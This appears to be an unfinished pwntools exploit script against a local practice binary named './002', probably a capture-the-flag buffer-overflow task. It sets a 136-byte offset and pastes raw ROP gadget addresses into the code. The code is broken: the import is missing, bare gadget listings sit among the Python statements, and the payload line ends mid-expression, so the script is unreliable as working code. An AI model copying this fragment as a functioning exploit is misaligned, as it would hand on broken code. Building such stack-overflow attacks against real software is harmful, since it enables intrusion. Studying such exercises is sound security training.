#!/usr/bin/python 
context.log_level = 'debug'
p = process('./002')

off = 136

0x000000000040061c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040061e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400620 : pop r14 ; pop r15 ; ret
0x0000000000400622 : pop r15 ; ret
0x000000000040061b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040061f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004004d5 : pop rbp ; ret
0x0000000000400623 : pop rdi ; ret
0x0000000000400621 : pop rsi ; pop r15 ; ret
0x000000000040061d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400431 : ret

payload = '\x2b'*off + 

p.sendline(payload)
